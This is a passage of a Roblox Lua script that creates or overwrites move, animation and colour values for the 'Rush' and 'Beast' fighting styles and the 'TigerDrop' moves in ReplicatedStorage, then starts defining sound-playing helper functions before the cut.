v.Value = Color3.fromRGB(254, 01, 154)
v.Name = ""Color""
if game.ReplicatedStorage.Styles.Rush:FindFirstChild(""RedHeat"") then
v = game.ReplicatedStorage.Styles.Rush[""RedHeat""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Rush)
end
v.Name = ""RedHeat""
if game.ReplicatedStorage.Styles.Rush:FindFirstChild(""VisualName"") then
v = game.ReplicatedStorage.Styles.Rush[""VisualName""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Rush)
end
v.Value = 'Rush'
v.Name = ""VisualName""
if game.ReplicatedStorage.Styles.Rush:FindFirstChild(""H_LowHealthFallen"") then
v = game.ReplicatedStorage.Styles.Rush[""H_LowHealthFallen""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Rush)
end
v.Value = 'H_FallenFinisher'
v.Name = ""H_LowHealthFallen""
if game.ReplicatedStorage.Styles.Rush:FindFirstChild(""H_Fallen"") then
v = game.ReplicatedStorage.Styles.Rush[""H_Fallen""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Rush)
end
v.Value = 'H_FallenStomp'
v.Name = ""H_Fallen""
if game.ReplicatedStorage.Styles.Rush:FindFirstChild(""H_BackWall"") then
v = game.ReplicatedStorage.Styles.Rush[""H_BackWall""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Rush)
end
v.Value = 'H_CrushingWall'
v.Name = ""H_BackWall""
if game.ReplicatedStorage.Styles.Rush:FindFirstChild(""Grab"") then
v = game.ReplicatedStorage.Styles.Rush[""Grab""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Rush)
end
v.Value = 'RSweep'
v.Name = ""Grab""
if game.ReplicatedStorage.Styles.Rush:FindFirstChild(""H_CounterSolo"") then
v = game.ReplicatedStorage.Styles.Rush[""H_CounterSolo""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Rush)
end
v.Value = 'H_FrenzySpinCounter'
v.Name = ""H_CounterSolo""
if game.ReplicatedStorage.Styles.Rush:FindFirstChild(""EvadeStrikeR"") then
v = game.ReplicatedStorage.Styles.Rush[""EvadeStrikeR""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Rush)
end
v.Value = 'RStrike2'
v.Name = ""EvadeStrikeR""
if game.ReplicatedStorage.Styles.Rush:FindFirstChild(""EvadeStrikeL"") then
v = game.ReplicatedStorage.Styles.Rush[""EvadeStrikeL""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Rush)
end
v.Value = 'RStrike2'
v.Name = ""EvadeStrikeL""
if game.ReplicatedStorage.Styles.Rush:FindFirstChild(""EvadeStrikeF"") then
v = game.ReplicatedStorage.Styles.Rush[""EvadeStrikeF""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Rush)
end
v.Value = 'RStrike2'
v.Name = ""EvadeStrikeF""
if game.ReplicatedStorage.Styles.Rush:FindFirstChild(""H_Stunned"") then
v = game.ReplicatedStorage.Styles.Rush[""H_Stunned""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Rush)
end
v.Value = 'H_FlyingKick'
v.Name = ""H_Stunned""
if game.ReplicatedStorage.Styles.Rush:FindFirstChild(""Rush2"") then
v = game.ReplicatedStorage.Styles.Rush[""Rush2""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Rush)
end
v.Value = '龍Attack2'
v.Name = ""Rush2""
if game.ReplicatedStorage.Styles.Rush:FindFirstChild(""Rush3"") then
v = game.ReplicatedStorage.Styles.Rush[""Rush3""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Rush)
end
v.Value = '龍Attack3'
v.Name = ""Rush3""
if game.ReplicatedStorage.Styles.Rush:FindFirstChild(""Rush4"") then
v = game.ReplicatedStorage.Styles.Rush[""Rush4""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Rush)
end
v.Value = '龍Attack1'
v.Name = ""Rush4""
if game.ReplicatedStorage.Styles.Rush:FindFirstChild(""Rush5"") then
v = game.ReplicatedStorage.Styles.Rush[""Rush5""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Rush)
end
v.Value = '龍Attack2'
v.Name = ""Rush5""
if game.ReplicatedStorage.Styles.Rush:FindFirstChild(""Rush6"") then
v = game.ReplicatedStorage.Styles.Rush[""Rush6""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Rush)
end
v.Value = '龍Attack3'
v.Name = ""Rush6""
if game.ReplicatedStorage.Styles.Rush:FindFirstChild(""Rush7"") then
v = game.ReplicatedStorage.Styles.Rush[""Rush7""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Rush)
end
v.Value = '龍Attack1'
v.Name = ""Rush7""
if game.ReplicatedStorage.Styles.Rush:FindFirstChild(""Rush8"") then
v = game.ReplicatedStorage.Styles.Rush[""Rush8""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Rush)
end
v.Value = '龍Attack4'
v.Name = ""Rush8""
if game.ReplicatedStorage.Styles.Rush:FindFirstChild(""Strike2"") then
v = game.ReplicatedStorage.Styles.Rush[""Strike2""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Rush)
end
v.Value = 'RStrike2'
v.Name = ""Strike2""
if game.ReplicatedStorage.Styles.Rush:FindFirstChild(""Strike3"") then
v = game.ReplicatedStorage.Styles.Rush[""Strike3""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Rush)
end
v.Value = '龍2Strike1'
v.Name = ""Strike3""
if game.ReplicatedStorage.Styles.Rush:FindFirstChild(""Strike4"") then
v = game.ReplicatedStorage.Styles.Rush[""Strike4""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Rush)
end
v.Value = '龍Strike5'
v.Name = ""Strike4""
if game.ReplicatedStorage.Styles.Rush:FindFirstChild(""Strike5"") then
v = game.ReplicatedStorage.Styles.Rush[""Strike5""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Rush)
end
v.Value = 'BStrike5'
v.Name = ""Strike5""
if game.ReplicatedStorage.Styles.Rush:FindFirstChild(""Strike6"") then
v = game.ReplicatedStorage.Styles.Rush[""Strike6""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Rush)
end
v.Value = 'BStrike4'
v.Name = ""Strike6""
if game.ReplicatedStorage.Styles.Rush:FindFirstChild(""Strike7"") then
v = game.ReplicatedStorage.Styles.Rush[""Strike7""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Rush)
end
v.Value = 'B2Strike4'
v.Name = ""Strike7""
if game.ReplicatedStorage.Styles.Rush:FindFirstChild(""Strike8"") then
v = game.ReplicatedStorage.Styles.Rush[""Strike8""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Rush)
end
v.Value = 'B2Strike3'
v.Name = ""Strike8""
if game.ReplicatedStorage.Styles.Rush:FindFirstChild(""Strike9"") then
v = game.ReplicatedStorage.Styles.Rush[""Strike9""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Rush)
end
v.Value = '龍2Strike4'
v.Name = ""Strike9""
if game.ReplicatedStorage.Styles.Rush:FindFirstChild(""Rush1"") then
v = game.ReplicatedStorage.Styles.Rush[""Rush1""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Rush)
end
v.Value = '龍Attack1'
v.Name = ""Rush1""
if game.ReplicatedStorage.Styles.Rush:FindFirstChild(""Strike1"") then
v = game.ReplicatedStorage.Styles.Rush[""Strike1""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Rush)
end
v.Value = 'B2Strike1'
v.Name = ""Strike1""
if game.ReplicatedStorage.Styles.Rush:FindFirstChild(""H_Running4"") then
v = game.ReplicatedStorage.Styles.Rush[""H_Running4""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Rush)
end
v.Value = 'H_Terror'
v.Name = ""H_Running4""
if game.ReplicatedStorage.Styles.Rush:FindFirstChild(""H_AirFallen"") then
v = game.ReplicatedStorage.Styles.Rush[""H_AirFallen""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Rush)
end
v.Value = 'H_Whirl'
v.Name = ""H_AirFallen""
if game.ReplicatedStorage.Styles.Rush:FindFirstChild(""GrabStrike"") then
v = game.ReplicatedStorage.Styles.Rush[""GrabStrike""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Rush)
end
v.Value = 'T_CounterQuickstep'
v.Name = ""GrabStrike""
if game.ReplicatedStorage.Styles.Rush.GrabStrike:FindFirstChild(""Ability"") then
v = game.ReplicatedStorage.Styles.Rush.GrabStrike[""Ability""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Rush.GrabStrike)
end
v.Value = 'Counter Quickstep'
v.Name = ""Ability""
if game.ReplicatedStorage.Styles.Rush:FindFirstChild(""H_FallenDown"") then
v = game.ReplicatedStorage.Styles.Rush[""H_FallenDown""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Rush)
end
v.Value = 'H_FallenKick'
v.Name = ""H_FallenDown""
if game.ReplicatedStorage.Styles.Rush:FindFirstChild(""H_EvadedB"") then
v = game.ReplicatedStorage.Styles.Rush[""H_EvadedB""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Rush)
end
v.Value = 'H_FastFootworkBack'
v.Name = ""H_EvadedB""
if game.ReplicatedStorage.Styles.Rush:FindFirstChild(""EvadeF"") then
v = game.ReplicatedStorage.Styles.Rush[""EvadeF""]
else
v = Instance.new(""Animation"", game.ReplicatedStorage.Styles.Rush)
end

v.AnimationId = ""rbxassetid://11710466763""
v.Name = ""EvadeF""
if game.ReplicatedStorage.Styles.Rush:FindFirstChild(""EvadeL"") then
v = game.ReplicatedStorage.Styles.Rush[""EvadeL""]
else
v = Instance.new(""Animation"", game.ReplicatedStorage.Styles.Rush)
end

v.AnimationId = ""rbxassetid://11710468004""
v.Name = ""EvadeL""
if game.ReplicatedStorage.Styles.Rush:FindFirstChild(""EvadeR"") then
v = game.ReplicatedStorage.Styles.Rush[""EvadeR""]
else
v = Instance.new(""Animation"", game.ReplicatedStorage.Styles.Rush)
end

v.AnimationId = ""rbxassetid://11710467557""
v.Name = ""EvadeR""
if game.ReplicatedStorage.Styles.Rush:FindFirstChild(""EvadeB"") then
v = game.ReplicatedStorage.Styles.Rush[""EvadeB""]
else
v = Instance.new(""Animation"", game.ReplicatedStorage.Styles.Rush)
end

v.AnimationId = ""rbxassetid://11710468479""
v.Name = ""EvadeB""
if game.ReplicatedStorage.Styles.Rush:FindFirstChild(""EvadeCR"") then
v = game.ReplicatedStorage.Styles.Rush[""EvadeCR""]
else
v = Instance.new(""Animation"", game.ReplicatedStorage.Styles.Rush)
end

v.AnimationId = ""rbxassetid://11710568545""
v.Name = ""EvadeCR""
if game.ReplicatedStorage.Styles.Rush:FindFirstChild(""EvadeCL"") then
v = game.ReplicatedStorage.Styles.Rush[""EvadeCL""]
else
v = Instance.new(""Animation"", game.ReplicatedStorage.Styles.Rush)
end

v.AnimationId = ""rbxassetid://11710568875""
v.Name = ""EvadeCL""
if game.ReplicatedStorage.Styles.Rush:FindFirstChild(""EvadeQCB"") then
v = game.ReplicatedStorage.Styles.Rush[""EvadeQCB""]
else
v = Instance.new(""Animation"", game.ReplicatedStorage.Styles.Rush)
end

v.AnimationId = ""rbxassetid://11632563534""
v.Name = ""EvadeQCB""
if game.ReplicatedStorage.Styles.Rush:FindFirstChild(""EvadeQCF"") then
v = game.ReplicatedStorage.Styles.Rush[""EvadeQCF""]
else
v = Instance.new(""Animation"", game.ReplicatedStorage.Styles.Rush)
end

v.AnimationId = ""rbxassetid://11632565056""
v.Name = ""EvadeQCF""
if game.ReplicatedStorage.Styles.Rush:FindFirstChild(""EvadeQCL"") then
v = game.ReplicatedStorage.Styles.Rush[""EvadeQCL""]
else
v = Instance.new(""Animation"", game.ReplicatedStorage.Styles.Rush)
end

v.AnimationId = ""rbxassetid://11632564616""
v.Name = ""EvadeQCL""
if game.ReplicatedStorage.Styles.Rush:FindFirstChild(""EvadeQCR"") then
v = game.ReplicatedStorage.Styles.Rush[""EvadeQCR""]
else
v = Instance.new(""Animation"", game.ReplicatedStorage.Styles.Rush)
end

v.AnimationId = ""rbxassetid://11632564233""
v.Name = ""EvadeQCR""
if game.ReplicatedStorage.Styles.Rush:FindFirstChild(""EvadeCF"") then
v = game.ReplicatedStorage.Styles.Rush[""EvadeCF""]
else
v = Instance.new(""Animation"", game.ReplicatedStorage.Styles.Rush)
end

v.AnimationId = ""rbxassetid://11716395378""
v.Name = ""EvadeCF""
if game.ReplicatedStorage.Styles.Rush:FindFirstChild(""EvadeCB"") then
v = game.ReplicatedStorage.Styles.Rush[""EvadeCB""]
else
v = Instance.new(""Animation"", game.ReplicatedStorage.Styles.Rush)
end

v.AnimationId = ""rbxassetid://11716396028""
v.Name = ""EvadeCB""
if game.ReplicatedStorage.Styles.Rush:FindFirstChild(""Block"") then
v = game.ReplicatedStorage.Styles.Rush[""Block""]
else
v = Instance.new(""Animation"", game.ReplicatedStorage.Styles.Rush)
end

v.AnimationId = ""rbxassetid://11776345813""
v.Name = ""Block""
if game.ReplicatedStorage.Styles.Rush:FindFirstChild(""H_EvadedR"") then
v = game.ReplicatedStorage.Styles.Rush[""H_EvadedR""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Rush)
end
v.Value = 'H_FastFootworkRight'
v.Name = ""H_EvadedR""
if game.ReplicatedStorage.Styles.Rush:FindFirstChild(""H_EvadedL"") then
v = game.ReplicatedStorage.Styles.Rush[""H_EvadedL""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Rush)
end
v.Value = 'H_FastFootworkLeft'
v.Name = ""H_EvadedL""
if game.ReplicatedStorage.Styles.Rush:FindFirstChild(""Idle"") then
v = game.ReplicatedStorage.Styles.Rush[""Idle""]
else
v = Instance.new(""Animation"", game.ReplicatedStorage.Styles.Rush)
end

v.AnimationId = ""rbxassetid://12120045620""
v.Name = ""Idle""
if game.ReplicatedStorage.Styles.Rush.Idle:FindFirstChild(""Core"") then
v = game.ReplicatedStorage.Styles.Rush.Idle[""Core""]
else
v = Instance.new(""Folder"", game.ReplicatedStorage.Styles.Rush.Idle)
end
v.Name = ""Core""
if game.ReplicatedStorage.Styles.Rush:FindFirstChild(""Hit1Block"") then
v = game.ReplicatedStorage.Styles.Rush[""Hit1Block""]
else
v = Instance.new(""Animation"", game.ReplicatedStorage.Styles.Rush)
end

v.AnimationId = ""rbxassetid://11959653217""
v.Name = ""Hit1Block""
if game.ReplicatedStorage.Styles.Rush:FindFirstChild(""Hit2Block"") then
v = game.ReplicatedStorage.Styles.Rush[""Hit2Block""]
else
v = Instance.new(""Animation"", game.ReplicatedStorage.Styles.Rush)
end

v.AnimationId = ""rbxassetid://11959653217""
v.Name = ""Hit2Block""
if game.ReplicatedStorage.Styles.Rush:FindFirstChild(""Run"") then
v = game.ReplicatedStorage.Styles.Rush[""Run""]
else
v = Instance.new(""Animation"", game.ReplicatedStorage.Styles.Rush)
end

v.AnimationId = ""rbxassetid://13731641248""
v.Name = ""Run""

if game.ReplicatedStorage.Styles:FindFirstChild(""Beast"") then
v = game.ReplicatedStorage.Styles[""Beast""]
else
v = Instance.new(""Folder"", game.ReplicatedStorage.Styles)
end
v.Name = ""Beast""
if game.ReplicatedStorage.Styles.Beast:FindFirstChild(""Rush1"") then
v = game.ReplicatedStorage.Styles.Beast[""Rush1""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Beast)
end
v.Value = 'BTPunch1'
v.Name = ""Rush1""
if game.ReplicatedStorage.Styles.Beast:FindFirstChild(""Speed"") then
v = game.ReplicatedStorage.Styles.Beast[""Speed""]
else
v = Instance.new(""NumberValue"", game.ReplicatedStorage.Styles.Beast)
end
v.Value = 0.75
v.Name = ""Speed""
if game.ReplicatedStorage.Styles.Beast:FindFirstChild(""StartBlock"") then
v = game.ReplicatedStorage.Styles.Beast[""StartBlock""]
else
v = Instance.new(""Animation"", game.ReplicatedStorage.Styles.Beast)
end

v.AnimationId = ""rbxassetid://10920901524""
v.Name = ""StartBlock""
if game.ReplicatedStorage.Styles.Beast:FindFirstChild(""GuardGrabHit"") then
v = game.ReplicatedStorage.Styles.Beast[""GuardGrabHit""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Beast)
end
v.Value = 'T_BearHug'
v.Name = ""GuardGrabHit""
if game.ReplicatedStorage.Styles.Beast.GuardGrabHit:FindFirstChild(""Ability"") then
v = game.ReplicatedStorage.Styles.Beast.GuardGrabHit[""Ability""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Beast.GuardGrabHit)
end
v.Value = 'Bear Hug'
v.Name = ""Ability""
if game.ReplicatedStorage.Styles.Beast:FindFirstChild(""Rush2"") then
v = game.ReplicatedStorage.Styles.Beast[""Rush2""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Beast)
end
v.Value = 'BTPunch2'
v.Name = ""Rush2""
if game.ReplicatedStorage.Styles.Beast:FindFirstChild(""Rush3"") then
v = game.ReplicatedStorage.Styles.Beast[""Rush3""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Beast)
end
v.Value = 'BTPunch3'
v.Name = ""Rush3""
if game.ReplicatedStorage.Styles.Beast:FindFirstChild(""Color"") then
v = game.ReplicatedStorage.Styles.Beast[""Color""]
else
v = Instance.new(""Color3Value"", game.ReplicatedStorage.Styles.Beast)
end
v.Value = Color3.fromRGB(255, 240, 31)
v.Name = ""Color""
if game.ReplicatedStorage.Styles.Beast:FindFirstChild(""H_LowHealthFallen"") then
v = game.ReplicatedStorage.Styles.Beast[""H_LowHealthFallen""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Beast)
end
v.Value = 'H_FallenFinisher'
v.Name = ""H_LowHealthFallen""
if game.ReplicatedStorage.Styles.Beast:FindFirstChild(""LThrow"") then
v = game.ReplicatedStorage.Styles.Beast[""LThrow""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Beast)
end
v.Value = 'T_LegToss'
v.Name = ""LThrow""
if game.ReplicatedStorage.Styles.Beast:FindFirstChild(""Strike1"") then
v = game.ReplicatedStorage.Styles.Beast[""Strike1""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Beast)
end
v.Value = 'BTStrike1'
v.Name = ""Strike1""
if game.ReplicatedStorage.Styles.Beast:FindFirstChild(""Strike2"") then
v = game.ReplicatedStorage.Styles.Beast[""Strike2""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Beast)
end
v.Value = 'BTStrike2'
v.Name = ""Strike2""
if game.ReplicatedStorage.Styles.Beast:FindFirstChild(""Strike3"") then
v = game.ReplicatedStorage.Styles.Beast[""Strike3""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Beast)
end
v.Value = 'BTStrike3'
v.Name = ""Strike3""
if game.ReplicatedStorage.Styles.Beast:FindFirstChild(""Strike4"") then
v = game.ReplicatedStorage.Styles.Beast[""Strike4""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Beast)
end
v.Value = 'BTStrike4'
v.Name = ""Strike4""
if game.ReplicatedStorage.Styles.Beast:FindFirstChild(""Grab"") then
v = game.ReplicatedStorage.Styles.Beast[""Grab""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Beast)
end
v.Value = 'BGrab'
v.Name = ""Grab""
if game.ReplicatedStorage.Styles.Beast:FindFirstChild(""EvadeB"") then
v = game.ReplicatedStorage.Styles.Beast[""EvadeB""]
else
v = Instance.new(""Animation"", game.ReplicatedStorage.Styles.Beast)
end

v.AnimationId = ""rbxassetid://11614916809""
v.Name = ""EvadeB""
if game.ReplicatedStorage.Styles.Beast:FindFirstChild(""RedHeat"") then
v = game.ReplicatedStorage.Styles.Beast[""RedHeat""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Beast)
end
v.Name = ""RedHeat""
if game.ReplicatedStorage.Styles.Beast:FindFirstChild(""VisualName"") then
v = game.ReplicatedStorage.Styles.Beast[""VisualName""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Beast)
end
v.Value = 'Beast'
v.Name = ""VisualName""
if game.ReplicatedStorage.Styles.Beast:FindFirstChild(""Throw"") then
v = game.ReplicatedStorage.Styles.Beast[""Throw""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Beast)
end
v.Value = 'T_BeastToss'
v.Name = ""Throw""
if game.ReplicatedStorage.Styles.Beast:FindFirstChild(""EvadeR"") then
v = game.ReplicatedStorage.Styles.Beast[""EvadeR""]
else
v = Instance.new(""Animation"", game.ReplicatedStorage.Styles.Beast)
end

v.AnimationId = ""rbxassetid://8223592585""
v.Name = ""EvadeR""
if game.ReplicatedStorage.Styles.Beast:FindFirstChild(""H_GrabOnWall"") then
v = game.ReplicatedStorage.Styles.Beast[""H_GrabOnWall""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Beast)
end
v.Value = 'H_WallSmack'
v.Name = ""H_GrabOnWall""
if game.ReplicatedStorage.Styles.Beast:FindFirstChild(""GrabCorpses"") then
v = game.ReplicatedStorage.Styles.Beast[""GrabCorpses""]
else
v = Instance.new(""Folder"", game.ReplicatedStorage.Styles.Beast)
end
v.Name = ""GrabCorpses""
if game.ReplicatedStorage.Styles.Beast:FindFirstChild(""H_GrabStanding"") then
v = game.ReplicatedStorage.Styles.Beast[""H_GrabStanding""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Beast)
end
v.Value = 'H_Piledriver'
v.Name = ""H_GrabStanding""
if game.ReplicatedStorage.Styles.Beast:FindFirstChild(""H_AbsorbBlock"") then
v = game.ReplicatedStorage.Styles.Beast[""H_AbsorbBlock""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Beast)
end
v.Value = 'H_Torment'
v.Name = ""H_AbsorbBlock""
if game.ReplicatedStorage.Styles.Beast:FindFirstChild(""H_TwoHandeds"") then
v = game.ReplicatedStorage.Styles.Beast[""H_TwoHandeds""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Beast)
end
v.Value = 'H_SelfDestruct'
v.Name = ""H_TwoHandeds""
if game.ReplicatedStorage.Styles.Beast:FindFirstChild(""H_GrabLeg"") then
v = game.ReplicatedStorage.Styles.Beast[""H_GrabLeg""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Beast)
end
v.Value = 'H_Swing'
v.Name = ""H_GrabLeg""
if game.ReplicatedStorage.Styles.Beast:FindFirstChild(""Taunt"") then
v = game.ReplicatedStorage.Styles.Beast[""Taunt""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Beast)
end
v.Value = 'BeastTaunt'
v.Name = ""Taunt""
if game.ReplicatedStorage.Styles.Beast:FindFirstChild(""Hit2Block"") then
v = game.ReplicatedStorage.Styles.Beast[""Hit2Block""]
else
v = Instance.new(""Animation"", game.ReplicatedStorage.Styles.Beast)
end

v.AnimationId = ""rbxassetid://10920909417""
v.Name = ""Hit2Block""
if game.ReplicatedStorage.Styles.Beast:FindFirstChild(""EndBlock"") then
v = game.ReplicatedStorage.Styles.Beast[""EndBlock""]
else
v = Instance.new(""Animation"", game.ReplicatedStorage.Styles.Beast)
end

v.AnimationId = ""rbxassetid://10920912941""
v.Name = ""EndBlock""
if game.ReplicatedStorage.Styles.Beast:FindFirstChild(""Hit1Block"") then
v = game.ReplicatedStorage.Styles.Beast[""Hit1Block""]
else
v = Instance.new(""Animation"", game.ReplicatedStorage.Styles.Beast)
end

v.AnimationId = ""rbxassetid://10920902836""
v.Name = ""Hit1Block""
if game.ReplicatedStorage.Styles.Beast:FindFirstChild(""Block"") then
v = game.ReplicatedStorage.Styles.Beast[""Block""]
else
v = Instance.new(""Animation"", game.ReplicatedStorage.Styles.Beast)
end

v.AnimationId = ""rbxassetid://10920916315""
v.Name = ""Block""
if game.ReplicatedStorage.Styles.Beast:FindFirstChild(""H_GrabOnFallen"") then
v = game.ReplicatedStorage.Styles.Beast[""H_GrabOnFallen""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Beast)
end
v.Value = 'H_LobCrush'
v.Name = ""H_GrabOnFallen""
if game.ReplicatedStorage.Styles.Beast:FindFirstChild(""H_Stunned"") then
v = game.ReplicatedStorage.Styles.Beast[""H_Stunned""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Beast)
end
v.Value = 'H_Knockout'
v.Name = ""H_Stunned""
if game.ReplicatedStorage.Styles.Beast:FindFirstChild(""HThrow"") then
v = game.ReplicatedStorage.Styles.Beast[""HThrow""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Beast)
end
v.Value = 'T_HeavyToss'
v.Name = ""HThrow""
if game.ReplicatedStorage.Styles.Beast:FindFirstChild(""LHThrow"") then
v = game.ReplicatedStorage.Styles.Beast[""LHThrow""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Beast)
end
v.Value = 'T_BHeavyToss'
v.Name = ""LHThrow""
if game.ReplicatedStorage.Styles.Beast:FindFirstChild(""H_FallenDown"") then
v = game.ReplicatedStorage.Styles.Beast[""H_FallenDown""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Beast)
end
v.Value = 'H_FallenGrate'
v.Name = ""H_FallenDown""
if game.ReplicatedStorage.Styles.Beast:FindFirstChild(""H_Fallen"") then
v = game.ReplicatedStorage.Styles.Beast[""H_Fallen""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Beast)
end
v.Value = 'H_FallenFinisher'
v.Name = ""H_Fallen""
if game.ReplicatedStorage.Styles.Beast:FindFirstChild(""EvadeF"") then
v = game.ReplicatedStorage.Styles.Beast[""EvadeF""]
else
v = Instance.new(""Animation"", game.ReplicatedStorage.Styles.Beast)
end

v.AnimationId = ""rbxassetid://11614916023""
v.Name = ""EvadeF""
if game.ReplicatedStorage.Styles.Beast:FindFirstChild(""EvadeL"") then
v = game.ReplicatedStorage.Styles.Beast[""EvadeL""]
else
v = Instance.new(""Animation"", game.ReplicatedStorage.Styles.Beast)
end

v.AnimationId = ""rbxassetid://8223592585""
v.Name = ""EvadeL""
if game.ReplicatedStorage.Styles.Beast:FindFirstChild(""Idle"") then
v = game.ReplicatedStorage.Styles.Beast[""Idle""]
else
v = Instance.new(""Animation"", game.ReplicatedStorage.Styles.Beast)
end

v.AnimationId = ""rbxassetid://13794669255""
v.Name = ""Idle""
if game.ReplicatedStorage.Styles.Beast.Idle:FindFirstChild(""Core"") then
v = game.ReplicatedStorage.Styles.Beast.Idle[""Core""]
else
v = Instance.new(""Folder"", game.ReplicatedStorage.Styles.Beast.Idle)
end
v.Name = ""Core""
if game.ReplicatedStorage.Styles.Beast:FindFirstChild(""H_GrabStanding3"") then
v = game.ReplicatedStorage.Styles.Beast[""H_GrabStanding3""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Beast)
end
v.Value = 'H_Entangle'
v.Name = ""H_GrabStanding3""
if game.ReplicatedStorage.Styles.Beast:FindFirstChild(""H_StunnedFront"") then
v = game.ReplicatedStorage.Styles.Beast[""H_StunnedFront""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Beast)
end
v.Value = 'H_KnockoutFront'
v.Name = ""H_StunnedFront""
if game.ReplicatedStorage.Moves[""龍TigerDrop""]:FindFirstChild(""Anim"") then
v = game.ReplicatedStorage.Moves[""龍TigerDrop""][""Anim""]
else
v = Instance.new(""Animation"", game.ReplicatedStorage.Moves[""龍TigerDrop""])
end
v.AnimationId = ""rbxassetid://12338275115"" 
v.Name = ""Anim""
if game.ReplicatedStorage.Moves[""龍TigerDrop""]:FindFirstChild(""ForceSF"") then
v = game.ReplicatedStorage.Moves[""龍TigerDrop""][""ForceSF""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Moves[""龍TigerDrop""])
end
v.Value = '0.1' 
v.Name = ""ForceSF""
if game.ReplicatedStorage.Moves[""TigerDrop""]:FindFirstChild(""Anim"") then
v = game.ReplicatedStorage.Moves[""TigerDrop""][""Anim""]
else
v = Instance.new(""Animation"", game.ReplicatedStorage.Moves[""TigerDrop""])
end
v.AnimationId = ""rbxassetid://12338275115"" 
v.Name = ""Anim""
if game.ReplicatedStorage.Moves[""TigerDrop""]:FindFirstChild(""HitDur"") then
v = game.ReplicatedStorage.Moves[""TigerDrop""][""HitDur""]
else
v = Instance.new(""NumberValue"", game.ReplicatedStorage.Moves[""TigerDrop""])
end
v.Value = 0.3 
v.Name = ""HitDur""
if game.ReplicatedStorage.Moves[""TigerDrop""]:FindFirstChild(""AniSpeed"") then
v = game.ReplicatedStorage.Moves[""TigerDrop""][""AniSpeed""]
else
v = Instance.new(""NumberValue"", game.ReplicatedStorage.Moves[""TigerDrop""])
end
v.Value = 1 
v.Name = ""AniSpeed""


local function playsound(id)
	local sfx = Instance.new(""Sound"", workspace)
	sfx.SoundId = ""rbxassetid://""..tostring(id)

	game:GetService(""SoundService""):PlayLocalSound(sfx)

	spawn(function()
		task.wait(sfx.TimeLength)
		sfx:Destroy()
	end)
end

function playticksound()
	local sfx = Instance.new(""Sound"", workspace)
	sfx.SoundId = ""rbxassetid://4843088994""

	game:GetService(""SoundService""):PlayLocalSound(sfx)

	spawn(function()
		task.wait(2)
		sfx:Destroy()
	end)
end

local function play_ingamesound(sfxname)
